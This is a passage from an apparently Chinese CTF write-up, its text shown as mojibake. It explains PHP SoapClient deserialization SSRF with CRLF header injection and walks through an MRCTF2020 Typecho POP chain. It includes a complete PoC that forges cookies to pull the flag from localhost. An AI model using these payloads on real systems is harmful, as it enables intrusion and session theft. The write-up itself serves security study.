class="variable">$c</span>-&gt;<span class="title function_ invoke__">a</span>();    <span class="comment">// éšä¾¿è°ƒç”¨å¯¹è±¡ä¸­ä¸å­˜åœ¨çš„æ–¹æ³•, è§¦å‘__callæ–¹æ³•è¿›è¡Œssrf</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/gh0st-9/images@main/image/202210041123899.png" alt="image-20221004112300785"></p><p>æˆåŠŸæ’å…¥è‡ªå®šä¹‰çš„<strong>Cookie</strong></p><p>è¿˜æœ‰ä¸€ä¸ªéœ€è¦æ³¨æ„çš„ç‚¹ï¼Œå› ä¸ºæˆ‘ä»¬ä¼ è¾“çš„æ˜¯POSTæ•°æ®ï¼Œæ‰€ä»¥è¿™é‡Œè¿˜éœ€è¦ä»¤<code>Content-Type</code>çš„å€¼ä¸º<code>application/x-www-form-urlencoded</code></p><p>è¿™é‡Œå› ä¸º<code>Content-Type</code>åœ¨<code>User-Agent</code>çš„ä¸‹é¢,æ‰€ä»¥æˆ‘ä»¬å¯ä»¥é€šè¿‡æ›´æ”¹<code>User-Agent</code>çš„å€¼æ¥æ›¿æ¢æ‰åŸæ¥çš„<code>Content-Type</code>çš„å€¼</p><p><strong>test3.php</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$target</span> = <span class="string">&#x27;https://requestbin.io/12lhej01&#x27;</span>;</span><br><span class="line"><span class="variable">$data</span> = <span class="string">&#x27;test&#x27;</span>;</span><br><span class="line"><span class="variable">$headers</span> = <span class="keyword">array</span>(</span><br><span class="line">    <span class="string">&#x27;X-Forwarded-For: 127.0.0.1&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Cookie: PHPSESSID=test&#x27;</span></span><br><span class="line">);</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">SoapClient</span>(<span class="literal">null</span>,<span class="keyword">array</span>(<span class="string">&#x27;location&#x27;</span> =&gt; <span class="variable">$target</span>,<span class="string">&#x27;user_agent&#x27;</span>=&gt;<span class="string">&#x27;Test^^Content-Type: application/x-www-form-urlencoded^^&#x27;</span>.<span class="title function_ invoke__">join</span>(<span class="string">&#x27;^^&#x27;</span>,<span class="variable">$headers</span>).<span class="string">&#x27;^^Content-Length: &#x27;</span>. (<span class="keyword">string</span>)<span class="title function_ invoke__">strlen</span>(<span class="variable">$data</span>).<span class="string">&#x27;^^^^&#x27;</span>.<span class="variable">$data</span>,<span class="string">&#x27;uri&#x27;</span>=&gt;<span class="string">&#x27;test&#x27;</span>));</span><br><span class="line"><span class="variable">$b</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="variable">$b</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;^^&#x27;</span>,<span class="string">&quot;\r\n&quot;</span>,<span class="variable">$b</span>);</span><br><span class="line"><span class="variable">$c</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$b</span>);</span><br><span class="line"><span class="variable">$c</span>-&gt;<span class="title function_ invoke__">a</span>();</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/gh0st-9/images@main/image/202210041126754.png" alt="image-20221004112610648"></p><h3 id="MRCTF2020-Ezpop-Revenge"><a href="#MRCTF2020-Ezpop-Revenge" class="headerlink" title="[MRCTF2020]Ezpop_Revenge"></a>[MRCTF2020]Ezpop_Revenge</h3><p>æ‰“å¼€é¢˜ç›®ï¼Œæ˜¯ä¸€ä¸ªTypechoå†™çš„é¡µé¢ï¼Œdirsearchæ‰«å‡º<a href="http://www.zip/">www.zip</a></p><p><strong>flag.php</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>)) <span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]===<span class="string">&quot;127.0.0.1&quot;</span>)&#123;</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;flag&#x27;</span>]= <span class="string">&quot;MRCTF&#123;******&#125;&quot;</span>;</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">echo</span> <span class="string">&quot;æˆ‘æ‰Œyour problem?\nonly localhost can get flag!&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>å¾ˆæ˜æ˜¾çš„è¿™æ˜¯ä¸ªssrf+ååºåˆ—åŒ–çš„é¢˜ç›®ï¼Œæ‰€ä»¥æƒ³åˆ°åˆ©ç”¨<code>SoapClient</code>ç±»æ¥å®ç°<code>ssrf</code>ï¼Œå½“è®¿é—®åï¼Œä¼šæŠŠ<code>flag</code>å†™è¿›è®¿é—®çš„<code>session</code>ä¸­</p><p>åœ¨<code>usr\plugins\HelloWorld\Plugin.php</code>ä¸­æ‰¾åˆ°è§¦å‘ç‚¹</p><p><img src="https://cdn.jsdelivr.net/gh/gh0st-9/images@main/image/202210041205415.png" alt="image-20221004120549336"></p><p>å¦‚æœå­˜åœ¨<code>$_REQUEST[&#39;admin&#39;]</code>ï¼Œå°±ä¼šæ‰“å°å‡ºsessionï¼Œæ­£å¥½flagå°±åœ¨sessionä¸­ï¼ŒåŒæ—¶å°†å¯¹ä¼ å…¥çš„<code>Coincid3nc3</code>å‚æ•°è¿›è¡Œååºåˆ—åŒ–</p><p>åŒæ ·åœ¨Plugin.phpä¸­</p><p><img src="https://cdn.jsdelivr.net/gh/gh0st-9/images@main/image/202210041207290.png" alt="image-20221004120740237"></p><p>åœ¨HelloWorld_DBç±»ä¸­å‘ç°äº†<code>__wakeup</code>é­”æœ¯æ–¹æ³•,åœ¨<code>__wakeup()</code>æ–¹æ³•å†…å®ä¾‹åŒ–äº†<code>Typecho_Db</code>ç±»</p><p>è·Ÿè¿›åˆ°<code>/var/Typecho/Db.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$adapterName</span>, <span class="variable">$prefix</span> = <span class="string">&#x27;typecho_&#x27;</span></span>)</span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">      <span class="comment">/** è·å–é€‚é…å™¨åç§° */</span></span><br><span class="line">      <span class="variable language_">$this</span>-&gt;_adapterName = <span class="variable">$adapterName</span>;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/** æ•°æ®åº“é€‚é…å™¨ */</span></span><br><span class="line">      <span class="variable">$adapterName</span> = <span class="string">&#x27;Typecho_Db_Adapter_&#x27;</span> . <span class="variable">$adapterName</span>;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (!<span class="title function_ invoke__">call_user_func</span>(<span class="keyword">array</span>(<span class="variable">$adapterName</span>, <span class="string">&#x27;isAvailable&#x27;</span>))) &#123;</span><br><span class="line">          <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">Typecho_Db_Exception</span>(<span class="string">&quot;Adapter <span class="subst">&#123;$adapterName&#125;</span> is not available&quot;</span>);<span class="comment">//__toString()</span></span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="variable language_">$this</span>-&gt;_prefix = <span class="variable">$prefix</span>;f</span><br><span class="line"></span><br><span class="line">      <span class="comment">/** åˆå§‹åŒ–å†…éƒ¨å˜é‡ */</span></span><br><span class="line">      <span class="variable language_">$this</span>-&gt;_pool = <span class="keyword">array</span>();</span><br><span class="line">      <span class="variable language_">$this</span>-&gt;_connectedPool = <span class="keyword">array</span>();</span><br><span class="line">      <span class="variable language_">$this</span>-&gt;_config = <span class="keyword">array</span>();</span><br><span class="line"></span><br><span class="line">      <span class="comment">//å®ä¾‹åŒ–é€‚é…å™¨å¯¹è±¡</span></span><br><span class="line">      <span class="variable language_">$this</span>-&gt;_adapter = <span class="keyword">new</span> <span class="variable">$adapterName</span>();</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>å…¶ä¸­$adapterNameè¢«å½“æˆå­—ç¬¦ä¸²æ‹¼æ¥ï¼Œå°±ä¼šè§¦å‘<code>__toString</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">this-&gt;_adapterName = <span class="variable">$adapterName</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/** æ•°æ®åº“é€‚é…å™¨ */</span></span><br><span class="line"><span class="variable">$adapterName</span> = <span class="string">&#x27;Typecho_Db_Adapter_&#x27;</span> . <span class="variable">$adapterName</span>;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__toString()å½“ä¸€ä¸ªå¯¹è±¡è¢«å½“ä½œå­—ç¬¦ä¸²å¯¹å¾…çš„æ—¶å€™ï¼Œä¼šè§¦å‘è¿™ä¸ªé­”æœ¯æ–¹æ³•</span><br></pre></td></tr></table></figure><p>å…¨å±€æœç´¢<code>__toString</code>ï¼Œè·Ÿè¿›åˆ°<code>/var/Typecho/Db/Query.php</code></p><p>å…¶ä¸­æœ‰ç”¨çš„éƒ¨åˆ†</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Typecho_Db_Query</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$_sqlPreBuild</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$_adapter</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">switch</span> (<span class="variable language_">$this</span>-&gt;_sqlPreBuild[<span class="string">&#x27;action&#x27;</span>]) &#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="title class_">Typecho_Db</span>::<span class="variable constant_">SELECT</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;_adapter-&gt;<span class="title function_ invoke__">parseSelect</span>(<span class="variable">$this</span>-&gt;_sqlPreBuild);</span><br><span class="line">            <span class="keyword">case</span> <span class="title class_">Typecho_Db</span>::<span class="variable constant_">INSERT</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&#x27;INSERT INTO &#x27;</span></span><br><span class="line">                . <span class="variable language_">$this</span>-&gt;_sqlPreBuild[<span class="string">&#x27;table&#x27;</span>]</span><br><span class="line">                . <span class="string">&#x27;(&#x27;</span> . <span class="title function_ invoke__">implode</span>(<span class="string">&#x27; , &#x27;</span>, <span class="title function_ invoke__">array_keys</span>(<span class="variable">$this</span>-&gt;_sqlPreBuild[<span class="string">&#x27;rows&#x27;</span>])) . <span class="string">&#x27;)&#x27;</span></span><br><span class="line">                . <span class="string">&#x27; VALUES &#x27;</span></span><br><span class="line">                . <span class="string">&#x27;(&#x27;</span> . <span class="title function_ invoke__">implode</span>(<span class="string">&#x27; , &#x27;</span>, <span class="title function_ invoke__">array_values</span>(<span class="variable">$this</span>-&gt;_sqlPreBuild[<span class="string">&#x27;rows&#x27;</span>])) . <span class="string">&#x27;)&#x27;</span></span><br><span class="line">                . <span class="variable language_">$this</span>-&gt;_sqlPreBuild[<span class="string">&#x27;limit&#x27;</span>];</span><br><span class="line">            <span class="keyword">case</span> <span class="title class_">Typecho_Db</span>::<span class="variable constant_">DELETE</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&#x27;DELETE FROM &#x27;</span></span><br><span class="line">                . <span class="variable language_">$this</span>-&gt;_sqlPreBuild[<span class="string">&#x27;table&#x27;</span>]</span><br><span class="line">                . <span class="variable language_">$this</span>-&gt;_sqlPreBuild[<span class="string">&#x27;where&#x27;</span>];</span><br><span class="line">            <span class="keyword">case</span> <span class="title class_">Typecho_Db</span>::<span class="variable constant_">UPDATE</span>:</span><br><span class="line">                <span class="variable">$columns</span> = <span class="keyword">array</span>();</span><br><span class="line">                <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;_sqlPreBuild[<span class="string">&#x27;rows&#x27;</span>])) &#123;</span><br><span class="line">                    <span class="keyword">foreach</span> (<span class="variable language_">$this</span>-&gt;_sqlPreBuild[<span class="string">&#x27;rows&#x27;</span>] <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$val</span>) &#123;</span><br><span class="line">                        <span class="variable">$columns</span>[] = <span class="string">&quot;<span class="subst">$key</span> = <span class="subst">$val</span>&quot;</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">return</span> <span class="string">&#x27;UPDATE &#x27;</span></span><br><span class="line">                . <span class="variable language_">$this</span>-&gt;_sqlPreBuild[<span class="string">&#x27;table&#x27;</span>]</span><br><span class="line">                . <span class="string">&#x27; SET &#x27;</span> . <span class="title function_ invoke__">implode</span>(<span class="string">&#x27; , &#x27;</span>, <span class="variable">$columns</span>)</span><br><span class="line">                . <span class="variable language_">$this</span>-&gt;_sqlPreBuild[<span class="string">&#x27;where&#x27;</span>];</span><br><span class="line">            <span class="keyword">default</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å…¶ä¸­<code>case Typecho_Db::SELECT=SELECT</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Typecho_Db</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">   <span class="keyword">const</span> <span class="variable constant_">DELETE</span> = <span class="string">&#x27;DELETE&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ‰€ä»¥å¦‚æœä»¤<code>$this-&gt;_sqlPreBuild[&#39;action&#39;]</code>ä¸ºSELECTï¼Œå°±èƒ½æ‰§è¡Œ<code>return $this-&gt;_adapter-&gt;parseSelect($this-&gt;_sqlPreBuild);</code>ï¼Œä¹Ÿå°±æ˜¯è°ƒç”¨<code>$this-&gt;_adapter</code>çš„<code>parseSelect()</code>æ–¹æ³•ï¼Œæ­¤æ—¶ï¼Œä»¤<code>$this-&gt;_adapter</code>ä¸º<strong>SoapClient</strong>ç±»ï¼Œç”±äºSoapClientç±»ä¸­æ²¡æœ‰parseSelect()æ–¹æ³•ï¼Œå°±èƒ½è§¦å‘äº†<code>SoapClient</code>çš„<code>__call()</code>é­”æœ¯æ–¹æ³•ï¼Œè€Œ<code>__call()</code>æ­£æ˜¯å®ç°SSRFçš„å…³é”®ï¼Œå…³äº<code>SoapClient</code>ç±»å®ç°ssrf</p><p>æ‰€ä»¥æ•´ä½“æ€è·¯å°±æœ‰äº†</p><h4 id="POPé“¾"><a href="#POPé“¾" class="headerlink" title="POPé“¾"></a>POPé“¾</h4><p>1ã€è¿›è¡Œååºåˆ—åŒ–çš„æ—¶å€™ï¼Œå°±ä¼šè§¦å‘<code>__wakeup</code>é­”æœ¯æ–¹æ³•ï¼Œåœ¨<code>__wakeup</code>æ–¹æ³•é‡Œå®ä¾‹åŒ–äº†<code>Typecho_Db</code>ç±»</p><p>2ã€<code>Typecho_Db</code>ç±»ä¸­å°†ä¸€ä¸ªå¯¹è±¡å½“ä½œå­—ç¬¦ä¸²æ‹¼æ¥è§¦å‘äº†<code>__toString</code>é­”æœ¯æ–¹æ³•</p><p>3ã€åœ¨<code>__toString()</code>å†…ï¼Œå¦‚æœä»¤<code>$_sqlPreBuild[&#39;action&#39;]</code>ä¸º<code>SELECT</code>å°±ä¼šè§¦å‘<code>$_adapter</code>çš„<code>parseSelect()</code>æ–¹æ³•</p><p>4ã€ä»¤<code>$_adapter</code>ä¸º<code>SoapClient</code>ç±»ï¼Œç”±äºSoapClientç±»ä¸­æ²¡æœ‰parseSelect()æ–¹æ³•ï¼Œå°±ä¼šè§¦å‘<code>SoapClient</code>çš„<code>__call()</code>é­”æœ¯æ–¹æ³•ï¼Œå®ç°ssrf</p><h4 id="è°ƒç”¨ç‚¹"><a href="#è°ƒç”¨ç‚¹" class="headerlink" title="è°ƒç”¨ç‚¹"></a>è°ƒç”¨ç‚¹</h4><p>åœ¨<code>/var/Typecho/Plugin.php</code>ä¸­</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">activate</span>(<span class="params"><span class="variable">$pluginName</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">self</span>::<span class="variable">$_plugins</span>[<span class="string">&#x27;activated&#x27;</span>][<span class="variable">$pluginName</span>] = <span class="built_in">self</span>::<span class="variable">$_tmp</span>;</span><br><span class="line">    <span class="built_in">self</span>::<span class="variable">$_tmp</span> = <span class="keyword">array</span>();</span><br><span class="line">    <span class="title class_">Helper</span>::<span class="title function_ invoke__">addRoute</span>(<span class="string">&quot;page_admin_action&quot;</span>,<span class="string">&quot;/page_admin&quot;</span>,<span class="string">&quot;HelloWorld_Plugin&quot;</span>,<span class="string">&#x27;action&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è®¿é—®<code>/page_admin</code>çš„æ—¶å€™ï¼Œä¼šè‡ªåŠ¨åŠ è½½<code>HelloWorld_Plugin</code>ç±»ï¼Œè€Œä¸”ä¼šè‡ªåŠ¨è°ƒç”¨<code>action</code>å‡½æ•°</p><h4 id="expè§£æ"><a href="#expè§£æ" class="headerlink" title="expè§£æ"></a>expè§£æ</h4><p><strong>POC</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Typecho_Db_Query</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$_sqlPreBuild</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$_adapter</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$target</span> = <span class="string">&#x27;http://127.0.0.1/flag.php&#x27;</span>;</span><br><span class="line">        <span class="variable">$headers</span> = <span class="keyword">array</span>(</span><br><span class="line">            <span class="string">&#x27;X-Forwarded-For: 127.0.0.1&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;Cookie: PHPSESSID=a86167abe7j6mjojp3o5dvkn47&#x27;</span></span><br><span class="line">        );</span><br><span class="line">        <span class="variable">$z</span> = <span class="keyword">new</span> <span class="title class_">SoapClient</span>(<span class="literal">null</span>, <span class="keyword">array</span>(<span class="string">&#x27;location&#x27;</span> =&gt; <span class="variable">$target</span>, <span class="string">&#x27;user_agent&#x27;</span> =&gt; <span class="string">&#x27;aaa^^&#x27;</span> . <span class="title function_ invoke__">join</span>(<span class="string">&#x27;^^&#x27;</span>, <span class="variable">$headers</span>), <span class="string">&#x27;uri&#x27;</span> =&gt; <span class="string">&quot;aaab&quot;</span>));</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;_sqlPreBuild = <span class="keyword">array</span>(<span class="string">&quot;action&quot;</span> =&gt; <span class="string">&quot;SELECT&quot;</span>);</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;_adapter = <span class="variable">$z</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HelloWorld_DB</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$coincidence</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;coincidence = [<span class="string">&quot;hello&quot;</span> =&gt; <span class="keyword">new</span> <span class="title class_">Typecho_Db_Query</span>()];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//ä¸‹é¢è¿™ä¸ªæ›¿æ¢å‡½æ•°ä¸çŸ¥é“æ˜¯æ¥è‡ªå“ªä¸ªå¸ˆå‚…çš„</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">decorate</span>(<span class="params"><span class="variable">$str</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$arr</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;:&#x27;</span>, <span class="variable">$str</span>);</span><br><span class="line">    <span class="variable">$newstr</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="title function_ invoke__">count</span>(<span class="variable">$arr</span>); <span class="variable">$i</span>++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/00/&#x27;</span>, <span class="variable">$arr</span>[<span class="variable">$i</span>])) &#123;</span><br><span class="line">            <span class="variable">$arr</span>[<span class="variable">$i</span> - <span class="number">2</span>] = <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/s/&#x27;</span>, <span class="string">&quot;S&quot;</span>, <span class="variable">$arr</span>[<span class="variable">$i</span> - <span class="number">2</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$i</span> = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (; <span class="variable">$i</span> &lt; <span class="title function_ invoke__">count</span>(<span class="variable">$arr</span>) - <span class="number">1</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">        <span class="variable">$newstr</span> .= <span class="variable">$arr</span>[<span class="variable">$i</span>];</span><br><span class="line">        <span class="variable">$newstr</span> .= <span class="string">&quot;:&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$newstr</span> .= <span class="variable">$arr</span>[<span class="variable">$i</span>];</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$newstr</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">HelloWorld</span>_DB();</span><br><span class="line"><span class="variable">$b</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="variable">$c</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="string">&quot; /\^\^/&quot;</span>, <span class="string">&quot;\r\n&quot;</span>, <span class="variable">$b</span>);</span><br><span class="line"><span class="variable">$d</span> = <span class="title function_ invoke__">urlencode</span>(<span class="variable">$c</span>);</span><br><span class="line"><span class="variable">$e</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/%00/&#x27;</span>, <span class="string">&#x27;%5c%30%30&#x27;</span>, <span class="variable">$d</span>);</span><br><span class="line"><span class="variable">$f</span> = <span class="title function_ invoke__">decorate</span>(<span class="title function_ invoke__">urldecode</span>(<span class="variable">$e</span>));</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="variable">$f</span>);</span><br></pre></td></tr></table></figure><p><strong>1.å°†å°å†™çš„sæ¢æˆå¤§å†™çš„Sï¼Œå¹¶æ·»åŠ \00</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">è¿™æ˜¯å› ä¸ºprivateå±æ€§ä¼šåœ¨ååºåˆ—åŒ–çš„ç”Ÿæˆä¸€ä¸ªæ ‡å¿—æ€§çš„%00</span><br><span class="line">1.PHPåœ¨åºåˆ—åŒ–æ—¶å±æ€§ä¸ºprivateå’Œprotectedçš„å˜é‡ä¼šå¼•å…¥ä¸å¯è§å­—ç¬¦\x00ï¼Œè€Œåœ¨è¾“å‡ºå’Œå¤åˆ¶çš„æ—¶å€™å¯èƒ½ä¼šé—å¤±è¿™äº›ä¿¡æ¯ï¼Œå¯¼è‡´ååºåˆ—åŒ–çš„æ—¶å€™å‡ºç°é”™è¯¯ã€‚</span><br><span class="line">2.privateå±æ€§åºåˆ—åŒ–çš„æ—¶å€™ä¼šå¼•å…¥ä¸¤ä¸ª\x00ï¼Œè¿™ä¸¤ä¸ª\x00å°±æ˜¯asciiç ä¸º0çš„å­—ç¬¦ã€‚è¿™ä¸ªå­—ç¬¦æ˜¾ç¤ºå’Œè¾“å‡ºå¯èƒ½çœ‹ä¸åˆ°ï¼Œç”šè‡³ä¼šå¯¼è‡´æˆªæ–­ï¼Œprotectedå±æ€§ä¼šå¼•å…¥\x00*\x00ã€‚</span><br><span class="line">3.åœ¨åºåˆ—åŒ–å†…å®¹ä¸­ç”¨å¤§å†™Sè¡¨ç¤ºå­—ç¬¦ä¸²ï¼Œæ­¤æ—¶è¿™ä¸ªå­—ç¬¦ä¸²å°±æ”¯æŒå°†åé¢çš„å­—ç¬¦ä¸²ç”¨16è¿›åˆ¶è¡¨ç¤ºã€‚</span><br></pre></td></tr></table></figure><p><strong>2.æ·»åŠ <code>\r\n</code>ï¼Œbase64ç¼–ç </strong></p><p>å› ä¸ºæƒ³è¦å¸¦SESSIONå‡ºæ¥ï¼Œå¿…é¡»è¦æŠŠè‡ªå·±çš„PHPSESSIDä¼ è¿‡å»ï¼Œç„¶è€ŒSOAPå¹¶ä¸èƒ½è®¾ç½®Cookieï¼Œå› æ­¤éœ€è¦<strong>CRLF</strong>ã€‚SoapClientå¯ä»¥è®¾ç½®UAï¼Œæ‰€ä»¥åœ¨UAååŠ ä¸Š\r\nCookie: PHPSESSID&#x3D;xxxå°±èƒ½æ·»åŠ 